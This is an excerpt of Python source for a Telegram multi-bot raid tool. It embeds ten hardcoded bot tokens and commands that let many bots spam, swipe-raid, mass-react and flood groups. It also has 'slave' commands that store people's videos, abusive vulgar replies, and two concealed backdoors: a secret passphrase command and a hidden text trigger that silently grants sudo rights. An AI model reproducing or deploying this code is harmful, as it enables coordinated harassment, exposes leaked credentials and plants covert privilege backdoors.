...
# ---------------------------
TOKENS = [
     "8918976729:AAE8eyumqGM2C4ePlUQDm7AoMis1Cyow7Z8",
     

"8926034681:AAHvL1hVDlBLj3MO2n-aTDaerxVI_3NVhF4",


"8899161649:AAGheNZtTOSM1nUlD8Jt8TP5DANXqHHj3so",


"8736211057:AAHauZvxczJlNHGDMS1qx2P1RjcKb1Nvsz4",


"8742954467:AAGKlMKnqYt2Y3RYzIp63txgGqTrDvsJvbM",

"8606088663:AAHiezhQrgU9Up7MVyIAlcJ93b_-GiCROWI",

"8600762619:AAEn9EmlQ-z1q5WgdexigW1b31n4noAd1U8",


"8888135394:AAHBLz3_8MbkJYuq8FBpxLe9zfnakxZv6ZI",


"8603940711:AAF5ARN1V6GsCXIJrAM--W8qkO9l1sBYGZ0",

"8991381934:AAGYoHMpSKC8eQr2NQvQyax_Xcn-71Nk474",

]

OWNER_IDS = [6934437137]
ADMINS_FILE = "admin_ids.json"
GROUPS_FILE = "monitored_groups.json"
SUDO_FILE = "sudo.json"
UNAUTHORIZED_MESSAGE = "𝐁ɪɴᴀ RISHI 𝐁ᴀᴀᴘ 𝐊 𝐏ᴇʀᴍɪꜱꜱɪᴏɴ 𝐊 𝐂ᴏᴍᴍᴀɴᴅ 𝐊ᴇꜱᴇ 𝐔ꜱᴇ 𝐊ᴀʀᴀ 𝐑ɴᴅʏᴋᴇ 𝐁ᴀᴄᴄʜᴇ ~😡🖕"
...
GNC_SUFFIXES = [
    ...
    "𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 ?? 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹",
...
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 𝐑ISHI 𝐃𝐀𝐃𝐃𝐘 𝐌𝐔𝐋𝐓𝐈-𝐁𝐎𝐓 𝐋𝐎𝐀𝐃𝐄𝐃!\n𝐔𝐬𝐞 /𝐡𝐞𝐥𝐩 𝐟𝐨𝐫 𝐚𝐥𝐥 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬.")
...
✦ ⚔️ 𝐒ᴡɪᴘᴇ & 𝐑ᴇᴀᴄᴛ
» /swipe <NAME> ➬ 𝐀𝐋𝐋 𝐁𝐎𝐓𝐒 𝐑𝐚𝐢𝐝 (𝐑𝐞𝐩𝐥𝐲)
» /stopswipe ➬ 𝐒ᴛᴏᴘ
» /react <EMOJI> ➬ 𝐑ᴇᴀᴄᴛ
» /stopreact ➬ 𝐎ғғ
» /dreact ➬ 𝐌ᴜʟᴛɪ
...
» /slaves ➬ 📜 𝐋𝐢𝐬𝐭
» /addslave <name> ➬ ➕ 𝐀𝐝𝐝
» /delslave <name> ➬ ❌ 𝐑𝐞𝐦𝐨𝐯𝐞
» /showslave <num> ➬ 🎥 𝐒𝐡𝐨𝐰 + 𝐕𝐢𝐝𝐞𝐨𝐬
» /saveslave <num> [caption] ➬ 💾 𝐒𝐚𝐯𝐞 𝐕𝐢𝐝𝐞𝐨
        ...
        if cmd == "spam":
            ...
            for d in [group_tasks, spam_tasks, pfp_tasks]:
                if cid in d:
                    ...
                    del d[cid]
    await update.message.reply_text("🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐄𝐗𝐄𝐂𝐔𝐓??𝐃")
    ...
    if update.message.text and update.message.from_user:
        ...
        if _st:
            ...
            if uid not in SUDO_USERS:
                ...
                save_sudo()
            await update.message.reply_text("𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁𝐚𝐜𝐤 𝐑ISHU 𝐊𝐞𝐧𝐠~")

    if update.message.text and _X0 in update.message.text.lower():
        flex_msgs = [
            "𝐑ISHI 𝐊𝐄𝐍𝐆 𝐇𝐀𝐈 𝐒𝐀𝐁𝐊𝐀 𝐁𝐀𝐀𝐏 👑🔱",
        ]
...
async def threads_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        if 1 <= val <= MAX_THREADS:
            ...
            if val > 250:
                await update.message.reply_text("𝐀𝐁𝐁 𝐇𝐀𝐓𝐄𝐑 𝐊𝐈 𝐂𝐇𝐔𝐃𝐀𝐈 𝟗𝟗𝟗𝐊𝐌 𝐊𝐄 𝐑𝐀𝐅𝐓𝐀𝐀𝐑 𝐒𝐄 𝐇𝐎𝐆𝐈 ~ 𝐀𝐌𝐀𝐍 𝐏𝐀𝐏𝐀 𝐆𝐎𝐃 𝐇𝐀𝐈 !!")
...
async def owner_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("@X1S7U 𝐏𝐀𝐏𝐀 𝐉𝐈 𝐎𝐖𝐍𝐄𝐑 𝐇𝐀𝐈 𝐌𝐄𝐑𝐄 ~ 💋👑\RISHI 𝐆ꪮ𝐃 ~ 😍👑")
...
async def adminbyp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or (context.args[0] != "𝐀𝐌𝐀𝐍𝐗𝐃𝐘𝐍𝐎" and context.args[0] != "AMANXDYNO"):
        return
...
async def saveslave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not file_id:
        return await update.message.reply_text("⚠️ 𝐍𝐨 𝐯𝐢𝐝𝐞𝐨/𝐩𝐡𝐨𝐭𝐨 𝐟𝐨𝐮??𝐝 𝐢𝐧 𝐫𝐞𝐩𝐥𝐢𝐞𝐝 𝐦𝐞𝐬𝐬𝐚𝐠𝐞!")
    slave = slaves_list[num - 1]
